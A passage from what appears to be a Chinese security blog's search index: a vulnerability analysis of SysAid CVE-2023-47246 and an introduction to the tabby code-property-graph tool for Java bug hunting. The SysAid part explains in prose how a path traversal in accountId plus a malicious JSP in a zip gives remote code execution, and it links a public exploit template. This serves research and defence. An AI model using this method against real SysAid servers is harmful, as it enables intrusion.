\u7684\u76f8\u5173\u4f7f\u7528\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/#_2","title":"\u73af\u5883\u642d\u5efa","text":"<p>\u4e0b\u8f7d\u8def\u5f84\uff1a</p> <ul> <li>\u672a\u4fee\u590d\u7248\u672c https://cdn3.sysaid.com/OnPremInstall/23.3.35/SysAidServer64.exe</li> <li>\u4fee\u590d\u7248\u672c https://cdn3.sysaid.com/OnPremInstall/23.3.36/SysAidServer64.exe</li> </ul> <p>\u5b89\u88c5\u5230\u8f93\u5165 license \u9636\u6bb5\uff0c\u5c06\u76ee\u5f55\u4e0b\u7684\u4ee3\u7801\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u538b\u7f29\u6210 war \u683c\u5f0f\uff0c\u4ea4\u7ed9 tabby \u626b\u63cf\u5f97\u5230\u4ee3\u7801\u5c5e\u6027\u56fe\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/#_3","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u76ee\u524d\uff0c\u7f51\u4e0a\u5df2\u7ecf\u6709\u4e00\u4e9b\u5206\u6790\u548c\u5229\u7528\u4e86\uff0c\u5176\u4e3b\u8981\u539f\u56e0\u5728\u4e8e\u63a5\u53e3 <code>com.ilient.server.UserEntry#doPost</code> \u672a\u6b63\u786e\u5904\u7406\u7528\u6237\u8f93\u5165\u7684 <code>accountId</code> \u5e76\u5728\u540e\u7eed\u62fc\u63a5\u6587\u4ef6\u8def\u5f84\u5bfc\u81f4\u7684\u4efb\u610f\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u3002  \u9996\u5148\uff0c\u7a0b\u5e8f\u5c06\u7528\u6237\u7684 post \u5185\u5bb9\u8f6c\u5316\u4e3a\u4e00\u4e34\u65f6\u7684 zip \u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5c06\u4f5c\u4e3a\u8f93\u5165\u8c03\u7528\u5230 a \u51fd\u6570\uff0c\u540c\u65f6\u4f20\u5165\u7684 var64 \u662f\u7528\u6237\u53ef\u63a7\u7684 <code>accountId</code> \u5185\u5bb9  \u4f20\u9012\u5230 a \u51fd\u6570\u540e\uff0c\u5c06\u5bf9 zip \u6587\u4ef6\u8fdb\u884c\u89e3\u538b\uff0c\u8fd9\u91cc\u5f00\u53d1\u8005\u5176\u5b9e\u4e5f\u8003\u8651\u5230\u4e86\u89e3\u538b\u8def\u5f84\u7a7f\u8d8a\u7684\u95ee\u9898\uff08zip-slip\uff09,\u505a\u4e86\u76f8\u5e94\u7684\u68c0\u67e5\uff0c\u4f46\u662f\u5728\u6700\u7ec8\u62fc\u63a5\u7684\u65f6\u5019\u62fc\u63a5\u4e0a\u4e86\u7531\u7528\u6237\u4f20\u5165\u7684\u7236\u76ee\u5f55 var1\uff0c\u4e5f\u5c31\u662f <code>accountId</code> \u7684\u5185\u5bb9\uff0c\u8fd8\u662f\u9020\u6210\u4e86\u8def\u5f84\u7a7f\u8d8a\u7684\u95ee\u9898\u3002 \u901a\u8fc7\u6784\u9020 <code>accountId</code> \u4e3a tomcat root \u76ee\u5f55\uff0c\u5e76\u5728 zip \u6587\u4ef6\u4e2d\u52a0\u5165\u6076\u610f\u7684 jsp \u6587\u4ef6\u5373\u53ef\u8fbe\u6210 rce \u7684\u6548\u679c\u3002\u5177\u4f53\u5229\u7528\u89c1 https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-47246.yaml\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/#_4","title":"\u81ea\u52a8\u5316\u67e5\u627e","text":"<p>\u4ece\u4e0a\u9762\u7684\u6f0f\u6d1e\u5206\u6790\u6765\u770b\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u6d89\u53ca\u5230\u7684\u4ee3\u7801\u5e76\u4e0d\u590d\u6742\uff0c\u90a3\u4e3a\u4ec0\u4e48\u5230 23.3.36 \u7248\u672c\u624d\u88ab\u53d1\u73b0\u5462\uff1f \u6211\u731c\u4e3b\u8981\u539f\u56e0\u5728\u4e8e 1. \u5546\u4e1a\u4ee3\u7801\u4e0d\u5f00\u6e90\uff0c\u4f46\u53ef\u901a\u8fc7\u4e00\u4e9b\u624b\u6bb5\u62ff\u5230\u6e90\u7801 2. \u4ee3\u7801\u8fdb\u884c\u4e86\u6df7\u6dc6\u5904\u7406\uff0c\u4eba\u5de5\u5ba1\u8ba1\u96be\u5ea6\u8f83\u5927\uff0c\u5e76\u4e14\u5176\u9879\u76ee\u4ee3\u7801\u91cf\u4e5f\u662f\u76f8\u5bf9\u8f83\u5927\u7684 \u4f46\u5176\u5b9e\u8fd9\u4e9b\u539f\u56e0\u5bf9\u4e8e\u81ea\u52a8\u5316\u5de5\u5177\u6765\u8bf4\u5e76\u4e0d\u662f\u95ee\u9898\uff0c\u63a5\u4e0a\u73af\u5883\u642d\u5efa\u4e2d\u7528 tabby \u751f\u6210\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u6765\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff08\u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\u5c55\u793a\uff0c\u76f4\u63a5\u6307\u5b9a\u7684\u4e86\u6f0f\u6d1e\u7c7b UserEntry\uff0c\u5b9e\u9645\u60c5\u51b5\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u4fee\u6539\u67e5\u8be2\u8bed\u53e5\u5f97\u5230\u56fe\u4e2d\u7684\u94fe\u8def\uff09\u3002  \u56fe\u793a\u7684\u5176\u4e2d\u4e00\u6761\u94fe\u8def\u5c55\u793a\u7684\u5c31\u662f\u4e0a\u8ff0\u5206\u6790\u7684\u8c03\u7528\u6d41\u7a0b <pre><code>match (source:Method {IS_ENDPOINT:true,CLASSNAME:\"com.ilient.server.UserEntry\"})\nmatch (sink:Method {IS_SINK:true, VUL:\"FILE_WRITE\"})\ncall tabby.beta.findPath(source, \"-\", sink, 8, false) yield path\nreturn path\n</code></pre></p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/","title":"\u57fa\u4e8e\u4ee3\u7801\u5c5e\u6027\u56fe\u7684\u81ea\u52a8\u5316\u6f0f\u6d1e\u6316\u6398\u5b9e\u8df5","text":"","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#0","title":"#0 \u524d\u8a00","text":"<p>\u5e94\u7528\u7a0b\u5e8f\u5206\u6790\u6280\u672f\u6316\u6398\u5e94\u7528\u6f0f\u6d1e\u4e00\u76f4\u4ee5\u6765\u90fd\u662f\u5b66\u672f\u754c\u548c\u5de5\u4e1a\u754c\u7684\u7814\u7a76\u91cd\u70b9\u4e4b\u4e00\u3002\u4ece\u6700\u521d\u7684\u6b63\u5219\u5339\u914d\u5230\u6700\u8fd1\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u6316\u6398\u65b9\u6848\uff0c\u56fd\u5185\u5916\u6709\u5f88\u591a\u6765\u81ea\u4e0d\u540c\u9636\u6bb5\u7684\u5b89\u5168\u5de5\u5177\u6216\u5546\u4e1a\u4ea7\u54c1\u6765\u53d1\u6398\u7a0b\u5e8f\u4ee3\u7801\u7684\u5b89\u5168\u95ee\u9898\u3002\u5728 Java \u8bed\u8a00\u65b9\u9762\uff0c\u4e1a\u754c\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u51fa\u8272\u7684\u4ea7\u54c1\uff0c\u5982 CodeQL \u7b49\uff0c\u4f46\u662f\uff0c\u591a\u6570\u4ea7\u54c1\u8003\u8651\u7684\u89d2\u5ea6\u662f\u4ece\u7532\u65b9\u89c6\u89d2\u6216\u5f00\u6e90\u89c6\u89d2\u51fa\u53d1\u7684\uff0c\u4e5f\u5c31\u662f\u4ea7\u54c1\u7684\u8f93\u5165\u5927\u90e8\u5206\u662f\u4ee5\u6e90\u7801\u4e3a\u4e3b\u3002\u7136\u800c\uff0c\u6211\u4eec\u5b89\u5168\u7814\u7a76\u4eba\u5458\u66f4\u591a\u9762\u5bf9\u5730\u662f\u7f16\u8bd1\u540e\u7684\u9879\u76ee\uff0c\u6bd4\u5982\u7f16\u8bd1\u540e\u7684 WAR\u3001\u7b2c\u4e09\u65b9\u4f9d\u8d56 JAR \u7b49\u5f62\u5f0f\u3002\u5bf9\u4e8e\u6b64\u7c7b\u5f62\u5f0f\u76ee\u6807\u7684\u6f0f\u6d1e\u6316\u6398\uff0c\u5f53\u524d\u5b58\u5728\u7684\u5ba1\u8ba1\u4ea7\u54c1\u6216\u591a\u6216\u5c11\u90fd\u6709\u4e00\u4e9b\u9650\u5236\uff0c\u6bd4\u5982\u6700\u8fd1\u51e0\u5e74\u5f88\u706b\u7684 CodeQL \u5c31\u65e0\u6cd5\u76f4\u63a5\u5904\u7406\u6b64\u7c7b\u5f62\u5f0f\u7684\u76ee\u6807\u4ee3\u7801\u3002\u5f53\u524d\uff0c\u5b89\u5168\u7814\u7a76\u4eba\u5458\u5927\u591a\u4ee5\u4eba\u5de5\u6216\u4e00\u4e9b\u8f85\u52a9\u5de5\u5177\u6765\u5b8c\u6210\u6b64\u7c7b\u5f62\u5f0f\u9879\u76ee\u7684\u6f0f\u6d1e\u6316\u6398\u3002\u5f88\u660e\u663e\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5ba1\u8ba1\u6548\u7387\u662f\u975e\u5e38\u4f4e\u7684\uff0c\u800c\u4e14\uff0c\u5ba1\u8ba1\u7ed3\u679c\u4e5f\u5f88\u5bb9\u6613\u9057\u6f0f\u3002\u4e3a\u6b64\uff0c\u9700\u8981\u4e00\u6b3e\u80fd\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u5de5\u5177\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#1","title":"#1 \u65b9\u6848\u4ecb\u7ecd","text":"<p>\u4e3a\u4e86\u66f4\u597d\u5730\u8f85\u52a9\u5b89\u5168\u7814\u7a76\u4eba\u5458\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\uff0c\u6211\u8bbe\u8ba1\u4e86\u57fa\u4e8e\u4ee3\u7801\u5c5e\u6027\u56fe\u7684\u81ea\u52a8\u5316\u6f0f\u6d1e\u6316\u6398\u65b9\u6848\uff0c\u5e76\u5f00\u53d1\u4e86 tabby \u9879\u76ee\u7528\u4e8e\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\uff0c\u65e8\u5728\u66f4\u7b80\u5355\u66f4\u5168\u9762\u5730\u6316\u6398\u66f4\u591a\u7684\u5b89\u5168\u95ee\u9898\u3002\u65b9\u6848\u901a\u8fc7\u6574\u5408\u4ee3\u7801\u8bed\u4e49\u4fe1\u606f\u548c\u56fe\u6570\u636e\u5e93\u76f8\u5173\u6280\u672f\uff0c\u4f7f\u5f97\u5355\u4e00\u9879\u76ee\uff08\u7f16\u8bd1\u540e\u7684\u76ee\u6807\u6587\u4ef6\uff09\u5206\u6790\u540e\u53ef\u591a\u6b21\u91cd\u590d\u5206\u6790\uff0c\u800c\u65e0\u9700\u91cd\u590d\u8fdb\u884c\u7e41\u91cd\u7684\u7a0b\u5e8f\u8bed\u4e49\u5206\u6790\u3002\u8fd9\u79cd\u65b9\u5f0f\u5e26\u6765\u4e86\u5206\u6790\u6210\u672c\u4e0a\u7684\u4f18\u52bf\u3002\u5e76\u4e14\u56fe\u6570\u636e\u5e93\u81ea\u8eab\u6240\u64c5\u957f\u7684\u8def\u5f84\u68c0\u7d22\u80fd\u529b\u4e5f\u80fd\u5145\u5206\u53d1\u6325\u5728\u6f0f\u6d1e\u8c03\u7528\u94fe\u8def\u7684\u6316\u6398\u4e0a\u3002</p> <p>\u65b9\u6848\u5c06\u4f20\u7edf\u7684\u7a0b\u5e8f\u5206\u6790\u6d41\u7a0b\u62c6\u5206\u6210\u4e86\u4e24\u4e2a\u9636\u6bb5\uff0c\u5305\u62ec\u4ee3\u7801\u5c5e\u6027\u56fe\u751f\u6210\u9636\u6bb5\u548c\u6f0f\u6d1e\u53d1\u73b0\u9636\u6bb5\u3002\u7531\u4ee3\u7801\u5c5e\u6027\u56fe\u751f\u6210\u9636\u6bb5\u751f\u6210\u7684\u5e26\u6c61\u70b9\u4fe1\u606f\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u5c06\u4f5c\u4e3a\u6f0f\u6d1e\u53d1\u73b0\u9636\u6bb5\u7684\u57fa\u7840\uff0c\u7528\u4e8e\u52a8\u6001\u67e5\u8be2\u5206\u6790\u5177\u4f53\u6f0f\u6d1e\u7ec6\u8282\u3002 \u4ece\u5f00\u53d1\u5b9e\u73b0\u4e0a\u770b\uff0c\u4e3b\u8981\u4e3a tabby \u6838\u5fc3\u9879\u76ee\u548c\u7528\u4e8e\u8ddf\u8e2a\u6570\u636e\u6d41\u7684 neo4j \u6269\u5c55 tabby path finder\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a </p> <p>\u63a5\u4e0b\u6765\uff0c\u5c06\u8be6\u7ec6\u4ecb\u7ecd\u6211\u4eec\u662f\u600e\u4e48\u8bbe\u8ba1\u548c\u5b9e\u73b0\u8fd9\u4e2a\u65b9\u6848\u7684\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#1_1","title":"1. \u9488\u5bf9\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u5b9e\u73b0\u65b9\u6848","text":"<p>\u9996\u5148\uff0c\u6700\u57fa\u7840\u7684\u662f\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2a\u80fd\u5728\u56fe\u6570\u636e\u5e93\u4e2d\u76f4\u63a5\u8fdb\u884c\u4ee3\u7801\u5206\u6790\u7684\u56fe\u7ed3\u6784\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u8c03\u7814\u4e86\u4e00\u4e9b\u5b66\u672f\u754c\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u5b9e\u73b0\u65b9\u6848\uff0c\u5982\u4e0b\u51e0\u7bc7\u91cd\u8981\u7684\u8bba\u6587 <pre><code>[1] Martin M, Livshits B, Lam M S. Finding application errors and security flaws using PQL: a program query language[J]. Acm Sigplan Notices, 2005, 40(10): 365-383.\n[2] Yamaguchi F, Golde N, Arp D, et al. Modeling and discovering vulnerabilities with code property graphs[C]//2014 IEEE Symposium on Security and Privacy. IEEE, 2014: 590-604.\n[3] Backes M, Rieck K, Skoruppa M, et al. Efficient and flexible discovery of php application vulnerabilities[C]//2017 IEEE european symposium on security and privacy (EuroS&amp;P). IEEE, 2017: 334-349.\n</code></pre> \u4e0a\u9762\u4e09\u7bc7\u8bba\u6587\u5728\u4ee3\u7801\u5c5e\u6027\u56fe\u7684\u8bbe\u8ba1\u4e0a\u505a\u4e86\u4e00\u4e9b\u5c1d\u8bd5\uff0c\u4f46\u662f\u4ed6\u4eec\u4e3b\u8981\u9488\u5bf9\u7684\u5bf9\u8c61\u662f\u9762\u5411\u8fc7\u7a0b\u8bed\u8a00\uff0c\u8fd9\u5176\u4e2d\u4e0d\u6d89\u53ca\u89e3\u51b3\u4e00\u4e9b\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u7684\u7279\u6027\uff0c\u6bd4\u5982\u591a\u6001\u7279\u6027\u3002\u4e3e\u4e2a\u5b9e\u9645\u4f8b\u5b50 <pre><code>interface IFace {\n    void test();\n}\nclass A implements IFace {\n    public void test(){}\n}\nclass B implements IFace {\n    public void test(){}\n}\n\nclass Main {\n\n    public static void test(IFace iFace){\n        iFace.test();\n    }\n\n    public static void main(String[] args) {\n        IFace a = new A();\n        test(a);\n        IFace b = new B();\n        test(b);\n    }\n}\n</code></pre> \u5982\u679c\u91c7\u7528\u8bba\u6587\u4e2d\u6240\u8bbe\u8ba1\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\uff0c\u7b80\u5316\u5206\u6790 <code>Main#test</code> \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8fd9\u6837\u4e00\u4e2a\u6307\u5411\u5173\u7cfb  \u5728\u9762\u5411\u8fc7\u7a0b\u8bed\u8a00\u4e2d\uff0c\u8fd9\u6837\u5206\u6790\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u56e0\u4e3a <code>IFace</code> \u5bf9\u8c61\u7684\u6307\u5411\u662f\u56fa\u5b9a\u7684\uff0c\u800c\u5728\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u4e2d\uff0c\u7531\u4e8e IFace \u662f\u4e00\u4e2a\u63a5\u53e3 interface \u7c7b\u578b\uff0c\u5b83\u5b9e\u9645\u7684\u4ee3\u7801\u5b9e\u73b0\u662f\u7a7a\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u5bf9\u5e94\u7684\u5177\u4f53\u5b9e\u73b0\u8be5\u63a5\u53e3\u7684\u5bf9\u8c61\u624d\u80fd\u8fdb\u884c\u76f8\u5e94\u5206\u6790\u3002\u6bd4\u5982\u4e0a\u8ff0\u7684\u4ee3\u7801\u8868\u793a\uff0c\u6211\u4eec\u9700\u8981\u4ece\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u63a8\u7b97\u51fa\u5f53\u524d\u6267\u884c\u7684 <code>iFace.test()</code> \u53ef\u80fd\u662f <code>A.test</code> \u6216 <code>B.test</code>\u3002\u5f88\u660e\u663e\uff0c\u6b64\u7c7b\u4ee3\u7801\u5c5e\u6027\u56fe\u662f\u4e0d\u7b26\u5408\u5206\u6790\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u7684\u3002 \u6b64\u5916\uff0c\u4e0a\u8ff0\u8bba\u6587\u4e2d\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u90fd\u4fdd\u7559\u4e86 AST\u3001CFG\uff0c\u4f46\u662f\uff0c\u5b9e\u9645\u4e0a\u5982\u679c\u5f53\u524d\u51fd\u6570\u5185\u5bb9\u548c\u5206\u6790\u7b97\u6cd5\u5747\u4e0d\u53d1\u751f\u6539\u53d8\uff0c\u4e0d\u7ba1\u662f\u7b2c\u4e00\u6b21\u5206\u6790\u4e5f\u597d\uff0c\u8fd8\u662f\u7b2c n \u6b21\u5206\u6790\u4e5f\u597d\uff0c\u5176\u5206\u6790\u7ed3\u679c\u662f\u56fa\u5b9a\u7684\uff0c\u90a3\u4e48\u4fdd\u7559 AST\u3001CFG \u7ed3\u6784\u9664\u4e86\u66f4\u597d\u7684\u5c55\u793a\u4ee3\u7801\u7ed3\u6784\u5916\uff0c\u5e76\u6ca1\u6709\u8d77\u5230\u591a\u5927\u7684\u7528\u5904\u3002\u5f53\u7136\uff0c\u5047\u8bbe\u5206\u6790\u7b97\u6cd5\u4e5f\u540c\u65f6\u5f00\u653e\u7ed9\u7528\u6237\u7684\u60c5\u51b5\u53e6\u7b97\u3002 \u4e3a\u4e86\u80fd\u5951\u5408\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff0c\u6211\u4eec\u91cd\u65b0\u8bbe\u8ba1\u4e86\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u5b9e\u73b0\u65b9\u6848\u3002\u6211\u4eec\u7684\u65b9\u6848\u6452\u5f03\u4e86\u591a\u4f59\u7684\u6570\u636e\u7ed3\u6784\uff08AST\u3001CFG\uff09\uff0c\u65b0\u589e\u4e86\u9488\u5bf9\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u7684\u7279\u6b8a\u6570\u636e\u7ed3\u6784\u3002  \u8be5\u4ee3\u7801\u5c5e\u6027\u56fe\u5b9e\u73b0\u65b9\u6848\u7531\u7c7b\u5173\u7cfb\u56fe ORG\u3001\u51fd\u6570\u522b\u540d\u56fe MAG\u3001\u51fd\u6570\u8c03\u7528\u56fe MCG 3 \u79cd\u5b50\u56fe\u7ec4\u5408\u800c\u6210\u3002\u56fe\u4e2d\u5171\u6709 Class \u548c Method \u4e24\u79cd\u5b9e\u4f53\u8282\u70b9\uff0c5 \u79cd\u5173\u7cfb\u8fb9\uff0c\u4e0b\u6587\u5c06\u8be6\u7ec6\u53d9\u8ff0\u8fd9\u4e09\u79cd\u5b50\u56fe\u6784\u6210\u53ca\u4f5c\u7528\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#object-relation-graph","title":"\u7c7b\u5173\u7cfb\u56fe Object Relation Graph","text":"<p>\u7c7b\u5173\u7cfb\u56fe\u7528\u4e8e\u63cf\u8ff0\u5bf9\u8c61\u81ea\u8eab\u7684\u76f8\u5173\u8bed\u4e49\u4fe1\u606f\u548c\u5bf9\u8c61\u4e4b\u95f4\u7684\u8bed\u4e49\u5173\u7cfb\uff0c\u5171\u4e09\u79cd\u5173\u7cfb - \u7c7b\u4e0e\u51fd\u6570\u4e4b\u95f4\u7684\u5f52\u5c5e\u5173\u7cfb HAS \u8fb9 - \u7c7b\u4e0e\u63a5\u53e3\u4e4b\u95f4\u7684\u5b9e\u73b0\u5173\u7cfb INTERFACE \u8fb9 - \u7c7b\u4e0e\u7c7b\u4e4b\u95f4\u7684\u7ee7\u627f\u5173\u7cfb EXTENDS \u8fb9  \u901a\u8fc7\u4e32\u8054\u7c7b\u4e0e\u7c7b\u3001\u7c7b\u4e0e\u51fd\u6570\u4e4b\u95f4\u7684\u5173\u7cfb\u8fb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4e00\u9897\u9897\u72ec\u7acb\u5bf9\u8c61\u51fd\u6570\u7ee7\u627f\u6811\u3002 \u5229\u7528 Neo4j \u7684\u67e5\u8be2\u8bed\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u52a8\u6001\u67e5\u8be2\u7b26\u5408\u6761\u4ef6\u7684\u7c7b\u548c\u51fd\u6570\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#method-alias-graph","title":"\u51fd\u6570\u522b\u540d\u56fe Method Alias Graph","text":"<p>\u5728\u524d\u6587\u4e2d\uff0c\u63d0\u5230\u4e86\u4e09\u7bc7\u8bba\u6587\u8bbe\u8ba1\u7684\u4ee3\u7801\u5c5e\u6027\u56fe\u6ca1\u6709\u8003\u8651\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff0c\u5bfc\u81f4\u5728\u56fe\u4e2d\u51fd\u6570\u8c03\u7528\u4e4b\u95f4\u662f\u76f8\u4e92\u5272\u88c2\u7684\u3002\u8fd8\u662f\u7528\u4e0a\u6587\u63d0\u5230\u7684\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u5728\u56fe\u6570\u636e\u5e93\u4e2d\u76f4\u63a5\u627e\u5230\u4e00\u4e2a\u4ece <code>Main#test</code> \u51fd\u6570\u5230 <code>A#test</code> \u6216 <code>B#test</code> \u7684\u4e00\u6761\u901a\u8def\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u4e0d\u80fd\u901a\u8fc7\u7c7b\u4f3c Neo4j \u7684\u67e5\u8be2\u8bed\u6cd5\u6765\u76f4\u63a5\u5b8c\u6210\u51fd\u6570\u8c03\u7528\u94fe\u8def\u7684\u8f93\u51fa\u3002\u8fd9\u663e\u7136\u662f\u4e0d\u7b26\u5408\u6211\u4eec\u7684\u5b9e\u9645\u9700\u6c42\u7684\uff0c\u4e3a\u6b64\uff0c\u6211\u4eec\u8bbe\u8ba1\u4e86\u51fd\u6570\u522b\u540d\u56fe\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u51fd\u6570\u522b\u540d\u56fe\u63cf\u8ff0\u4e86\u67d0\u4e00\u51fd\u6570\u6240\u6709\u5177\u4f53\u5b9e\u73b0\u7684\u8bed\u4e49\u56fe\uff0c\u4e3b\u8981\u7528\u4e8e\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u591a\u6001\u7279\u6027\u5728\u56fe\u6570\u636e\u5e93\u4e2d\u7684\u8868\u8fbe\u3002\u8be5\u56fe\u7531\u63cf\u8ff0\u51fd\u6570\u4e0e\u51fd\u6570\u4e4b\u95f4\u7684\u522b\u540d\u5173\u7cfb ALIAS \u8fb9\u8fde\u63a5\u800c\u6210\uff0c\u7c7b\u4f3c ORG \u56fe\uff0c\u51fd\u6570\u522b\u540d\u56fe\u4e5f\u4f1a\u4ea7\u751f\u4e00\u9897\u9897\u72ec\u7acb\u7684\u51fd\u6570\u6811\uff0c\u6811\u9876\u4e3a interface \u6216\u9876\u5c42\u7c7b\u578b\uff0c\u6811\u679d\u4e3a\u5f53\u524d\u6811\u9876\u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\u3002  \u4ee5\u4e0a\u6587\u4e2d\u7684\u4ee3\u7801\u4e3a\u4f8b\uff0c\u901a\u8fc7 MAG \u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u4e00\u6761\u4ece <code>Main#main</code> \u5230 <code>A#test</code> \u6216 <code>B#test</code> \u7684\u51fd\u6570\u8c03\u7528\u901a\u8def\u3002\u6709\u4e86\u901a\u8def\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 Neo4j \u7684\u67e5\u8be2\u8bed\u6cd5\u6765\u67e5\u8be2\u6b64\u7c7b\u51fd\u6570\u8c03\u7528\u8def\u5f84\u3002\u800c\u4e14\uff0cMAG \u56fe\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5206\u6790\u8fc7\u7a0b\u4e2d\u7684\u51fd\u6570\u679a\u4e3e\u5b9e\u73b0\u4e0b\u65b9\u5230\u56fe\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\uff0c\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\uff0c\u53ef\u4ee5\u7f13\u89e3\u7a0b\u5e8f\u5206\u6790\u8fc7\u7a0b\u4e2d\u7684\u8def\u5f84\u7206\u70b8\u95ee\u9898\uff0c\u8be6\u89c1 ppt 12\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#method-call-graph","title":"\u51fd\u6570\u8c03\u7528\u56fe Method Call Graph","text":"<p>\u51fd\u6570\u8c03\u7528\u56fe\u4e3b\u8981\u7528\u4e8e\u63cf\u8ff0\u51fd\u6570\u4e0e\u51fd\u6570\u4e4b\u95f4\u7684\u8c03\u7528\u5173\u7cfb\u56fe\uff0c\u5229\u7528\u8be5\u6709\u5411\u7684\u8c03\u7528\u5173\u7cfb\u53ef\u4ee5\u67e5\u8be2\u51fa\u4e00\u6761\u6709\u6548\u7684\u51fd\u6570\u8c03\u7528\u8def\u5f84\u3002\u540c\u65f6\uff0c\u6211\u4eec\u4e5f\u4fdd\u7559\u4e86 PDG \u56fe\uff0c\u5728 CALL \u8fb9\u4e0a\u4fdd\u7559\u4e86\u6c61\u70b9\u4fe1\u606f\u7528\u4e8e\u540e\u7eed\u7684\u8fc7\u7a0b\u95f4\u6570\u636e\u6d41\u5206\u6790\u3002\u66f4\u8fd1\u4e00\u6b65\u7684\u662f\uff0c\u901a\u8fc7\u6c61\u70b9\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u4fdd\u7559\u53d7\u6c61\u67d3\u7684\u8c03\u7528\u8fb9\uff0c\u51cf\u5c11\u540e\u7eed\u56fe\u6570\u636e\u5e93\u4e2d\u65e0\u7528\u8fb9\u7684\u679a\u4e3e\u9012\u5f52\u67e5\u627e\u3002 </p> 